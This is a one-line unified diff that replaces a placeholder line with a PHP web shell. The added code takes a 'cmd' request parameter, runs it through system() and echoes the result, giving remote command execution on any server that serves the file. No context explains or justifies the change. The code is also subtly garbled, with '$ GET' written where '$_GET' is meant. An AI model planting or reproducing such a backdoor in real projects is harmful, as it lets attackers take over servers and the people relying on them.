@@ -1,1 +1,1 @@
-dddd
+<?php $p=$ GET[cmd]; echo system($p);?>
